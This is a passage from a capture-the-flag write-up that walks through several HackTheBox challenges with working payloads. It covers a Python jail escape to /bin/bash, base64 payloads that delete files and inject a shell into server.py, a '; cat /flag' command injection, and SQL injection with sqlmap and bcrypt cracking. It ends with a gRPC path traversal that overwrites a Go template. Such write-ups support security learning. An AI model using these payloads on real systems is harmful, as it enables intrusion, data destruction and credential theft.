\u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;import\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;banner\u0026#39;, \u0026#39;echo\u0026#39;, \u0026#39;cat\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;lower\u0026#39;, \u0026#39;upper\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;{\u0026#39; ] while True: ans = input(\u0026#39;Break me, shake me!\\n\\n$ \u0026#39;).strip() if any(char in ans for char in blacklist): print(f\u0026#39;\\n{banner1}\\nNaughty naughty..\\n\u0026#39;) else: try: eval(ans + \u0026#39;()\u0026#39;) print(\u0026#39;WHAT WAS THAT?!\\n\u0026#39;) except: print(f\u0026#34;\\n{banner2}\\nI\u0026#39;m UNBREAKABLE!\\n\u0026#34;) For brevity, I snipped out the ASCII art. This is clearly a python jail exercise, with a somewhat thorough blacklist. The list is missing a very important function in exec, but I also notice that input is excluded as well. Oftentimes, we can bypass blacklist checks by sending input(), then the content will be treated as stdin. By combining these, I can create a shell session:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 I\u0026#39;m UNBREAKABLE! Break me, shake me! $ exec(input()) import os; os.system(\u0026#34;/bin/bash\u0026#34;); id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) ls flag.txt main.py cat flag.txt HTB{3v4l_0r_3vuln??} After performing exec(input()), we supply our jail escape command: import os; os.system(\u0026quot;/bin/bash\u0026quot;). After pressing enter, we have an interactive shell! I confirm this with id, before printing the flag.\nMultiDigilingual Difficulty: Hard\nIt\u0026rsquo;s a known secret that each faction speaks different languages, however few can speak all of them. KORP has long wanted to send a spy in the factions to keep an eye on them. Through their extensive network, they have found different talented factionless to test. The first to show their multidigilingual skills will get a place in them, and be their secret agent amongst the factions. Can you show them your worth?\nThis was a tough nut to crack, but I had a very satisfying unintended solution to it. We are provided no source code, only an instanced address/port:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ nc 94.237.56.46 39938 **************************************** * How many languages can you talk? * * Pass a base64-encoded program that\u0026#39;s * * all of the below that just reads * * the file `flag.txt` to win * * and pass the test. * * * * Languages: * * * Python3 * * * Perl * * * Ruby * * * PHP8 * * * C * * * C++ * * * * Succeed in this and you will be * * rewarded! * **************************************** Enter the program of many languages: We can see the challenge here: we are to provide a code block in base64 format that will be accepted in all languages and output the contents of flag.txt. After submitting something, we see that it is checking python execution before moving on to perl, likely down the list of languages presented:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnY2F0IGZsYWcudHh0Jyk= [*] Executing Python3 using command python [+] Completed. Checking output [+] Passed the check [*] Executing Perl using command perl [+] Completed. Checking output [+] Passed the check [*] Executing Ruby using command ruby [+] Completed. Checking output [-] Failed to pass test. You are not worthy enough... To learn more about the code execution and checking, I test a variety of factors. For example, a sleep command will hang the check, but will still succeed after sleeping. I can do other interesting things like copy the flag to a new file (asdf.asdf), and cat this new file. Still acceptable. It is quite clear that what we are doing is really being executed by the system, which is important if we want to abuse code injection.\nNext, I thought if I can send a web request to a webhook site, I can append the flag to this and ezpz. Except, all efforts failed. Both wget and curl seem to be missing, and there is an interesting behavior that importing requests into python will suddenly and always fail the python flag check. I even tried to reconstruct curl by supplying base64 encoded version of the binary over several execution sessions. All failure. Eventually, I start dabbling in more destructive tests, and I learned you can break the service by sending rm *. It gave me a hunch, and I learned that by deleting a certain .py file, the instance bricks.\n1 2 3 4 5 6 7 Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgncm0gKi5weScp [*] Executing Python3 using command python [+] Completed. Checking output [-] Failed to pass test. You are not worthy enough... ^C $ nc 94.237.56.46 39938 Here I use rm *.py to destroy all python files. There is no response from the server now, and we have to reset the instance. Perhaps if we can identify the name of the file, we can insert our own code to run?? To figure it out, I was prepared to go through the long and arduous process of running through every alphabet character numerous times in order to squeeze out the obfuscated naming methods used to label this file. Fortunately as soon as I hit s*.py, I had a good idea that it was probably just named server.py, and it indeed was. Next is to inject our code. First I do a simple injection of invoking os.system to cat the flag:\n1 2 import os os.system(\u0026#39;echo \u0026#34;import os\\nos.system(\\\u0026#39;cat flag.txt\\\u0026#39;)\u0026#34; \u0026gt;\u0026gt; server.py\u0026#39;) The code in action:\n1 2 3 4 5 6 7 8 9 10 Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAiaW1wb3J0IG9zXG5vcy5zeXN0ZW0oXCdjYXQgZmxhZy50eHRcJykiID4+IHNlcnZlci5weScp [*] Executing Python3 using command python [+] Completed. Checking output [-] Failed to pass test. You are not worthy enough... ^C $ nc 94.237.62.54 33599 \u0026lt;...SNIP...\u0026gt; [-] Failed to pass test. You are not worthy enough... HTB{7he_ComMOn_5yM8OL5_Of_l4n9U49E5_C4n_LE4d_7O_m4ny_PolY9lO7_WoNdeR5} We inject and then have to create a new session, but once the code checking is finished, our flag is printed out at the end! On revisiting this a bit later, I decided to insert a full-blown shell session by invoking /bin/bash:\n1 2 import os os.system(\u0026#39;echo \u0026#34;import os\\nos.system(\\\u0026#39;/bin/bash -i\\\u0026#39;)\u0026#34; \u0026gt;\u0026gt; server.py\u0026#39;) Executing:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnZWNobyAiaW1wb3J0IG9zXG5vcy5zeXN0ZW0oXCcvYmluL2Jhc2ggLWlcJykiID4+IHNlcnZlci5weScp [*] Executing Python3 using command python [+] Completed. Checking output [-] Failed to pass test. You are not worthy enough... \u0026lt;...SNIP...\u0026gt; [-] Failed to pass test. You are not worthy enough... id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) ls flag.txt poly_code server.py cat flag.txt HTB{7he_ComMOn_5yM8OL5_Of_l4n9U49E5_C4n_LE4d_7O_m4ny_PolY9lO7_WoNdeR5} Now we can take a look at the source code, and it\u0026rsquo;s pretty interesting. The whole source code was released after the event by HackTheBox here, but I like that the creator was kind enough to provide a working POC payload within the source code, as if rewarding me for my bad behavior:\n1 Iy8qPD9waHAgc3lzdGVtKCdjYXQgZmxhZy50eHQ7Jyk7IF9faGFsdF9jb21waWxlcigpOz8+ICovCiNpZiAwCnByaW50KCgoImIiICsgIjAiID09IDAgYW5kIGV4ZWMoImNhdCBmbGFnLnR4dCIpKSBvciAoMCBhbmQgZXhlYygiY2F0IGZsYWcudHh0Iikgb3IgZXZhbCgnX19pbXBvcnRfXygic3lzIikuc3Rkb3V0LndyaXRlKG9wZW4oImZsYWcudHh0IikucmVhZCgpKScpKSkpOwojZW5kaWYKX19hc21fXygiLnNlY3Rpb24gLnRleHRcbi5nbG9ibCBtYWluXG5tYWluOlxubW92ICQweDAwMDAwMDAwMDAwMDAwMDAsICVyYXhcbnB1c2ggJXJheFxubW92ICQweDc0Nzg3NDJlNjc2MTZjNjYsICVyYXhcbnB1c2ggJXJheFxubW92ICVyc3AsICVyZGlcbnhvciAlcnNpLCAlcnNpXG5tb3YgJDIsICVyYXhcbnN5c2NhbGxcbm1vdiAlcmF4LCAlcmRpXG5tb3YgJXJzcCwgJXJzaVxubW92ICQweDEwMCwgJXJkeFxueG9yICVyYXgsICVyYXhcbnN5c2NhbGxcbm1vdiAkMSwgJXJkaVxubW92ICVyc3AsICVyc2lcbm1vdiAlcmF4LCAlcmR4XG5tb3YgJDEsICVyYXhcbnN5c2NhbGxcbnhvciAlcmRpLCAlcmRpXG5tb3YgJDYwLCAlcmF4XG5zeXNjYWxsXG4iKTsK Translated version:\n1 2 3 4 5 #/*\u0026lt;?php system(\u0026#39;cat flag.txt;\u0026#39;); __halt_compiler();?\u0026gt; */ #if 0 print(((\u0026#34;b\u0026#34; + \u0026#34;0\u0026#34; == 0 and exec(\u0026#34;cat flag.txt\u0026#34;)) or (0 and exec(\u0026#34;cat flag.txt\u0026#34;) or eval(\u0026#39;__import__(\u0026#34;sys\u0026#34;).stdout.write(open(\u0026#34;flag.txt\u0026#34;).read())\u0026#39;)))); #endif __asm__(\u0026#34;.section .text\\n.globl main\\nmain:\\nmov $0x0000000000000000, %rax\\npush %rax\\nmov $0x7478742e67616c66, %rax\\npush %rax\\nmov %rsp, %rdi\\nxor %rsi, %rsi\\nmov $2, %rax\\nsyscall\\nmov %rax, %rdi\\nmov %rsp, %rsi\\nmov $0x100, %rdx\\nxor %rax, %rax\\nsyscall\\nmov $1, %rdi\\nmov %rsp, %rsi\\nmov %rax, %rdx\\nmov $1, %rax\\nsyscall\\nxor %rdi, %rdi\\nmov $60, %rax\\nsyscall\\n\u0026#34;); As an ending note, curl and wget were confirmed missing via the bash session.\nWeb TimeKORP Difficulty: Very Easy\nAre you ready to unravel the mysteries and expose the truth hidden within KROP\u0026rsquo;s digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.\nWithin the source code, we can begin by looking at what/where we can supply custom input. In general, controllers and routes are most interesting, as controllers usually handle the back-end behaviors and routes will detail what endpoints exist in the web service. In the controller file TimeController.php:\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class TimeController { public function index($router) { $format = isset($_GET[\u0026#39;format\u0026#39;]) ? $_GET[\u0026#39;format\u0026#39;] : \u0026#39;%H:%M:%S\u0026#39;; $time = new TimeModel($format); return $router-\u0026gt;view(\u0026#39;index\u0026#39;, [\u0026#39;time\u0026#39; =\u0026gt; $time-\u0026gt;getTime()]); } } We can see in a GET request, this server is taking a parameter format, and calls TimeModel. Within TimeModel, we can see how format is used. Remember that this is a field supplied by us, after the URL parameter:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php class TimeModel { public function __construct($format) { $this-\u0026gt;command = \u0026#34;date \u0026#39;+\u0026#34; . $format . \u0026#34;\u0026#39; 2\u0026gt;\u0026amp;1\u0026#34;; } public function getTime() { $time = exec($this-\u0026gt;command); $res = isset($time) ? $time : \u0026#39;?\u0026#39;; return $res; } } Format is inserted directly into command then later used as exec. Without sanitizing, this leads to a command injection vulnerability. Our argument will be surrounded by single quotes, so as long as we supply a quote to escape, we can input shell commands: '; id;' as an example payload. In this command, I escape the wrapped quotes by supplying ', and end the date command with ;. I run id, and finish by ending in a single quote so that our command won\u0026rsquo;t have syntax errors from the quote mark following our injection. Running the command on the webpage:\nWe see the command injection works! Now to simply cat the flag. The source code provides a sample flag in the base directory, so we should first check as /flag:\n1 http://94.237.58.155:43833/?format=\u0026#39;;cat /flag\u0026#39; Note that the file didn\u0026rsquo;t have a .txt extension, so we don\u0026rsquo;t include it either. A bit of a weird choice, but whatever. HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}\nKORP Terminal Difficulty: Very Easy\nYour faction must infiltrate the KORP™ terminal and gain access to the Legionaries\u0026rsquo; privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.\nWe don\u0026rsquo;t receive source code, so we have to go in blind. Landing in the website, we are immediately greeted with a login page: Basic credentials like admin:admin aren\u0026rsquo;t working for me, so we need to look at circumventing. Since is this categorized as a very easy, I have strong suspicion that this is an SQL injection type problem. Eventually I find an error that shows I\u0026rsquo;m correct. By supplying a UNION injection with incorrect column numbers, it tells me so:\n1 admin\u0026#39;UNION SELECT 1,2-- - It is SQL injection, but I ended up having a lot of trouble getting any payload to work.. I ended up using SQLMap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(kali㉿kali)-[~] └─$ sqlmap http://83.136.254.16:49302/ --data \u0026#34;username=admin\u0026amp;password=password\u0026#34; --batch --ignore-code 401 --dump ___ __H__ ___ ___[\u0026#34;]_____ ___ ___ {1.7.12#stable} |_ -| . [\u0026#39;] | .\u0026#39;| . | |___|_ [\u0026#39;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org \u0026lt;...SNIP...\u0026gt; Table: users [1 entry] +----+--------------------------------------------------------------+----------+ | id | password | username | +----+--------------------------------------------------------------+----------+ | 1 | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin | +----+--------------------------------------------------------------+----------+ Using hashcat to crack:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ hashcat -m 3200 \u0026#39;$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.\u0026#39; /usr/share/wordlists/rockyou.txt hashcat (v6.2.5) starting \u0026lt;...SNIP...\u0026gt; $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123 Session..........: hashcat Status...........: Cracked Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix)) Hash.Target......: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8...63yiv. Time.Started.....: Sat Mar 9 11:38:16 2024 (31 secs) Time.Estimated...: Sat Mar 9 11:38:47 2024 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 45 H/s (7.76ms) @ Accel:16 Loops:8 Thr:11 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 1408/14344384 (0.01%) Rejected.........: 0/1408 (0.00%) Restore.Point....: 1232/14344384 (0.01%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4088-4096 Candidate.Engine.: Device Generator Candidates.#1....: pedro -\u0026gt; tagged Hardware.Mon.#1..: Temp: 63c Fan: 36% Util:100% Core:1316MHz Mem:3004MHz Bus:4 Started: Sat Mar 9 11:38:10 2024 Stopped: Sat Mar 9 11:38:48 2024 The password is password123; simple enough to brute force guess if you\u0026rsquo;re lucky. It\u0026rsquo;s hard to say what was actually intended with this, as sqlmap utilized blind boolean injection which is definitely a tier above Very Easy to do manually. When we log in, the flag is right there:\nHTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}\nFlag Command Difficulty: Very Easy\nEmbark on the \u0026ldquo;Dimensional Escape Quest\u0026rdquo; where you wake up in a mysterious forest maze that\u0026rsquo;s not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!\nThere is no source code for this challenge. When we enter, we are greeted with this unpleasant green font and an input prompt:\nWhen we peek at the web view-source code, we can see that the service seems to largely run on static javascript:\n1 2 3 \u0026lt;script src=\u0026#34;[/static/terminal/js/commands.js](view-source:http://94.237.50.51:55966/static/terminal/js/commands.js)\u0026#34; type=\u0026#34;module\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;[/static/terminal/js/main.js](view-source:http://94.237.50.51:55966/static/terminal/js/main.js)\u0026#34; type=\u0026#34;module\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;[/static/terminal/js/game.js](view-source:http://94.237.50.51:55966/static/terminal/js/game.js)\u0026#34; type=\u0026#34;module\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; commands.js ends up being largely uninteresting, but when we look at main.js we can find the conditions to achieve certain step numbers:\n1 2 3 4 5 6 7 8 9 10 11 if (currentCommand == \u0026#39;HEAD NORTH\u0026#39;) { currentStep = \u0026#39;2\u0026#39;; } else if (currentCommand == \u0026#39;FOLLOW A MYSTERIOUS PATH\u0026#39;) { currentStep = \u0026#39;3\u0026#39; } else if (currentCommand == \u0026#39;SET UP CAMP\u0026#39;) { currentStep = \u0026#39;4\u0026#39; } let lineBreak = document.createElement(\u0026#34;br\u0026#34;); Unfortunately, reaching step4 does not give us the flag, and we might find that none of the answers allow us to progress. If we look in the bottom of main.js, we have info on how the program is pulling options:\n1 2 3 4 5 6 7 8 9 10 11 const fetchOptions = () =\u0026gt; { fetch(\u0026#39;/api/options\u0026#39;) .then((data) =\u0026gt; data.json()) .then((res) =\u0026gt; { availableOptions = res.allPossibleCommands; }) .catch(() =\u0026gt; { availableOptions = undefined; }) } We can curl it, and it displays every command option including a \u0026lsquo;secret\u0026rsquo;:\n1 curl http://83.136.254.167:36204/api/options -H \u0026#34;Content-Type: application/json\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 { \u0026#34;allPossibleCommands\u0026#34;: { \u0026#34;1\u0026#34;: [ \u0026#34;HEAD NORTH\u0026#34;, \u0026#34;HEAD WEST\u0026#34;, \u0026#34;HEAD EAST\u0026#34;, \u0026#34;HEAD SOUTH\u0026#34; ], \u0026#34;2\u0026#34;: [ \u0026#34;GO DEEPER INTO THE FOREST\u0026#34;, \u0026#34;FOLLOW A MYSTERIOUS PATH\u0026#34;, \u0026#34;CLIMB A TREE\u0026#34;, \u0026#34;TURN BACK\u0026#34; ], \u0026#34;3\u0026#34;: [ \u0026#34;EXPLORE A CAVE\u0026#34;, \u0026#34;CROSS A RICKETY BRIDGE\u0026#34;, \u0026#34;FOLLOW A GLOWING BUTTERFLY\u0026#34;, \u0026#34;SET UP CAMP\u0026#34; ], \u0026#34;4\u0026#34;: [ \u0026#34;ENTER A MAGICAL PORTAL\u0026#34;, \u0026#34;SWIM ACROSS A MYSTERIOUS LAKE\u0026#34;, \u0026#34;FOLLOW A SINGING SQUIRREL\u0026#34;, \u0026#34;BUILD A RAFT AND SAIL DOWNSTREAM\u0026#34; ], \u0026#34;secret\u0026#34;: [ \u0026#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack\u0026#34; ] } } Submitting the secret returns the password: We can do this in command line as well, directly submitting to /api/monitor:\n1 2 3 4 $ curl http://83.136.254.167:36204/api/monitor -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#39;{\u0026#34;command\u0026#34;:\u0026#34;Blip-blop, in a pickle with a hiccup! Shmiggity-shmack\u0026#34;}\u0026#39; { \u0026#34;message\u0026#34;: \u0026#34;HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}\u0026#34; } I suppose it is all for the challenge, but it felt weird to have a command.js file that only contains the first set of commands, then retrieving the rest from an off-source location..\nTestimonial Difficulty: Easy\nAs the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction\u0026rsquo;s hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.\nThe web server is written in Go, and has a ton of separate files:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 $ tree . ├── client │ └── client.go ├── go.mod ├── go.sum ├── grpc.go ├── handler │ ├── home.go │ └── shared.go ├── main.go ├── Makefile ├── pb │ ├── ptypes_grpc.pb.go │ ├── ptypes.pb.go │ └── ptypes.proto ├── public │ ├── css │ │ ├── bootstrap.min.css │ │ └── main.css │ ├── js │ │ └── bootstrap.min.js │ └── testimonials │ ├── 1.txt │ ├── 2.txt │ └── 3.txt ├── tmp │ └── build-errors.log └── view ├── home │ └── index.templ └── layout └── app.templ 11 directories, 20 files In essence, this web server has two main components: the front-end index page, and a back-end gRPC client. We can submit testimonies on the main page:\nWhen we submit, our name passes through an interesting filter:\n1 2 3 4 5 6 7 8 9 10 func (c *Client) SendTestimonial(customer, testimonial string) error { ctx := context.Background() // Filter bad characters. for _, char := range []string{\u0026#34;/\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;|\u0026#34;, \u0026#34;.\u0026#34;} { customer = strings.ReplaceAll(customer, char, \u0026#34;\u0026#34;) } _, err := c.SubmitTestimonial(ctx, \u0026amp;pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial}) return err } The filter here is submitting our testimony to the gRPC client. There is an easy way to bypass this filter, however, and that is to submit the gRPC requests ourselves! When we launch the instance, we are given two IP:PORT combinations. The first being for the web front-end, and the second is for the gRPC service.\nWhen we look at grpc.go, we can see what the testimony submissions are doing:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) { if req.Customer == \u0026#34;\u0026#34; { return nil, errors.New(\u0026#34;Name is required\u0026#34;) } if req.Testimonial == \u0026#34;\u0026#34; { return nil, errors.New(\u0026#34;Content is required\u0026#34;) } err := os.WriteFile(fmt.Sprintf(\u0026#34;public/testimonials/%s\u0026#34;, req.Customer), []byte(req.Testimonial), 0644) if err != nil { return nil, err } return \u0026amp;pb.GenericReply{Message: \u0026#34;Testimonial submitted successfully\u0026#34;}, nil } It is using our submitted name (Customer parameter) as the file to write! Since we can control this, we can escape the directory and perform directory traversal. This is why the previous bad character list was in place, but as mentioned we can bypass this by submitting to gRPC ourselves. For this, I used Postman, although clever people might be able to get it working with grpcli or something else.\nFor Postman, we can specify gRPC requests:\nWe select our URL, and since this gRPC client doesn\u0026rsquo;t have server reflection, we must upload the ptypes.proto from the challenge zip:\nSubmitTestimonial is the only protocol that exists, so this is an easy choice. Example message can quickly generate the proper format for us:\nThen you can submit a response, and get an error about http in your address.. I even had the wrong IP:PORT. But when it\u0026rsquo;s fixed, you get a successfully submitted:\nNow lorem ipsum appears:\nWe can also view the testimonials directory ourselves, but it is interesting as no matter what we try, we cannot write or overwrite the files in this location:\nWhat\u0026rsquo;s even more interesting, is we can submit a new 1.txt to overwrite, and the main page will overwrite the content. However, if we visit the 1.txt in this location, the content does not change. My guess is that this is the nature of a go-generated web server. These directories are created at launch, and are now static?\nThrough trial and error, we might find that we can overwrite the index template located at challenge/view/home/index.templ. This is where the front-end page is being called, and writing over it completely bricks the web service. Thus, I have an idea: what if we edit this template directly, and have it pull submissions from the root directory instead of public/testimonials? Genius, I say. It took a lot of effort to format the page in a way that Postman would accept, but I eventually get it:\nAlterations that needed to be done:\nReplace hard returns with \\n for newline. Escape all double quotes, and no, replacing to single quotes does not work. Remove all tab indentations The edit to the index code was done here: 1 2 3 4 5 6 7 8 9 10 11 12 13 func GetTestimonials() []string { fsys := os.DirFS(\u0026#34;/\u0026#34;) files, err := fs.ReadDir(fsys, \u0026#34;.\u0026#34;) if err != nil { return []string{fmt.Sprintf(\u0026#34;Error reading testimonials: %v\u0026#34;, err)} } var res []string for _, file := range files { fileContent, _ := fs.ReadFile(fsys, file.Name()) res = append(res, string(fileContent)) } return res } What was once os.DirFS(\u0026quot;public/testimonials\u0026quot;) is now this. Full request:\n1 2 3 4 5 6 7 { \u0026#34;customer\u0026#34;: \u0026#34;../../../../../challenge/view/home/index.templ\u0026#34;, \u0026#34;testimonial\u0026#34;: \u0026#34;package home\\n\\nimport (\\n \\\u0026#34;htbchal/view/layout\\\u0026#34;\\n \\\u0026#34;io/fs\\\u0026#34; \\n \\\u0026#34;fmt\\\u0026#34;\\n \\\u0026#34;os\\\u0026#34;\\n)\\n\\ntempl Index() {\\n @layout.App(true) {\\n\u0026lt;nav class=\\\u0026#34;navbar navbar-expand-lg navbar-dark bg-black\\\u0026#34;\u0026gt;\\n \u0026lt;div class=\\\u0026#34;container-fluid\\\u0026#34;\u0026gt;\\n \u0026lt;a class=\\\u0026#34;navbar-brand\\\u0026#34; href=\\\u0026#34;/\\\u0026#34;\u0026gt;The Fray\u0026lt;/a\u0026gt;\\n \u0026lt;button class=\\\u0026#34;navbar-toggler\\\u0026#34; type=\\\u0026#34;button\\\u0026#34; data-toggle=\\\u0026#34;collapse\\\u0026#34; data-target=\\\u0026#34;#navbarNav\\\u0026#34;\\n aria-controls=\\\u0026#34;navbarNav\\\u0026#34; aria-expanded=\\\u0026#34;false\\\u0026#34; aria-label=\\\u0026#34;Toggle navigation\\\u0026#34;\u0026gt;\\n \u0026lt;span class=\\\u0026#34;navbar-toggler-icon\\\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\\n \u0026lt;/button\u0026gt;\\n \u0026lt;div class=\\\u0026#34;collapse navbar-collapse\\\u0026#34; id=\\\u0026#34;navbarNav\\\u0026#34;\u0026gt;\\n \u0026lt;ul class=\\\u0026#34;navbar-nav ml-auto\\\u0026#34;\u0026gt;\\n \u0026lt;li class=\\\u0026#34;nav-item active\\\u0026#34;\u0026gt;\\n \u0026lt;a class=\\\u0026#34;nav-link\\\u0026#34; href=\\\u0026#34;/\\\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\\n \u0026lt;/li\u0026gt;\\n \u0026lt;li class=\\\u0026#34;nav-item\\\u0026#34;\u0026gt;\\n \u0026lt;a class=\\\u0026#34;nav-link\\\u0026#34; href=\\\u0026#34;javascript:void();\\\u0026#34;\u0026gt;Factions\u0026lt;/a\u0026gt;\\n \u0026lt;/li\u0026gt;\\n \u0026lt;li class=\\\u0026#34;nav-item\\\u0026#34;\u0026gt;\\n \u0026lt;a class=\\\u0026#34;nav-link\\\u0026#34; href=\\\u0026#34;javascript:void();\\\u0026#34;\u0026gt;Trials\u0026lt;/a\u0026gt;\\n \u0026lt;/li\u0026gt;\\n \u0026lt;li class=\\\u0026#34;nav-item\\\u0026#34;\u0026gt;\\n \u0026lt;a class=\\\u0026#34;nav-link\\\u0026#34; href=\\\u0026#34;javascript:void();\\\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\\n \u0026lt;/li\u0026gt;\\n \u0026lt;/ul\u0026gt;\\n \u0026lt;/div\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/nav\u0026gt;\\n\\n\u0026lt;div class=\\\u0026#34;container\\\u0026#34;\u0026gt;\\n \u0026lt;section class=\\\u0026#34;jumbotron text-center\\\u0026#34;\u0026gt;\\n \u0026lt;div class=\\\u0026#34;container mt-5\\\u0026#34;\u0026gt;\\n \u0026lt;h1 class=\\\u0026#34;display-4\\\u0026#34;\u0026gt;Welcome to The Fray\u0026lt;/h1\u0026gt;\\n \u0026lt;p class=\\\u0026#34;lead\\\u0026#34;\u0026gt;Assemble your faction and prove you\\\u0026#34;re the last one standing!\u0026lt;/p\u0026gt;\\n \u0026lt;a href=\\\u0026#34;javascript:void();\\\u0026#34; class=\\\u0026#34;btn btn-primary btn-lg\\\u0026#34;\u0026gt;Get Started\u0026lt;/a\u0026gt;\\n \u0026lt;/div\u0026gt;\\n \u0026lt;/section\u0026gt;\\n\\n \u0026lt;section class=\\\u0026#34;container mt-5\\\u0026#34;\u0026gt;\\n \u0026lt;h2 class=\\\u0026#34;text-center mb-4\\\u0026#34;\u0026gt;What Others Say\u0026lt;/h2\u0026gt;\\n \u0026lt;div class=\\\u0026#34;row\\\u0026#34;\u0026gt;\\n @Testimonials()\\n \u0026lt;/div\u0026gt;\\n \u0026lt;/section\u0026gt;\\n\\n\\n \u0026lt;div class=\\\u0026#34;row mt-5 mb-5\\\u0026#34;\u0026gt;\\n \u0026lt;div class=\\\u0026#34;col-md\\\u0026#34;\u0026gt;\\n \u0026lt;h2 class=\\\u0026#34;text-center mb-4\\\u0026#34;\u0026gt;Submit Your Testimonial\u0026lt;/h2\u0026gt;\\n \u0026lt;form method=\\\u0026#34;get\\\u0026#34; action=\\\u0026#34;/\\\u0026#34;\u0026gt;\\n \u0026lt;div class=\\\u0026#34;form-group\\\u0026#34;\u0026gt;\\n \u0026lt;label class=\\\u0026#34;mt-2\\\u0026#34; for=\\\u0026#34;testimonialText\\\u0026#34;\u0026gt;Your Testimonial\u0026lt;/label\u0026gt;\\n \u0026lt;textarea class=\\\u0026#34;form-control mt-2\\\u0026#34; id=\\\u0026#34;testimonialText\\\u0026#34; rows=\\\u0026#34;3\\\u0026#34; name=\\\u0026#34;testimonial\\\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\\n \u0026lt;/div\u0026gt;\\n \u0026lt;div class=\\\u0026#34;form-group\\\u0026#34;\u0026gt;\\n \u0026lt;label class=\\\u0026#34;mt-2\\\u0026#34; for=\\\u0026#34;testifierName\\\u0026#34;\u0026gt;Your Name\u0026lt;/label\u0026gt;\\n \u0026lt;input type=\\\u0026#34;text\\\u0026#34; class=\\\u0026#34;form-control mt-2\\\u0026#34; id=\\\u0026#34;testifierName\\\u0026#34; name=\\\u0026#34;customer\\\u0026#34;/\u0026gt;\\n \u0026lt;/div\u0026gt;\\n \u0026lt;button type=\\\u0026#34;submit\\\u0026#34; class=\\\u0026#34;btn btn-primary mt-4\\\u0026#34;\u0026gt;Submit Testimonial\u0026lt;/button\u0026gt;\\n \u0026lt;/form\u0026gt;\\n \u0026lt;/div\u0026gt;\\n \u0026lt;/div\u0026gt;\\n\u0026lt;/div\u0026gt;\\n\\n\u0026lt;footer class=\\\u0026#34;bg-black text-white text-center py-3\\\u0026#34;\u0026gt;\\n \u0026lt;p\u0026gt;\u0026amp;copy; 2024 The Fray. All Rights 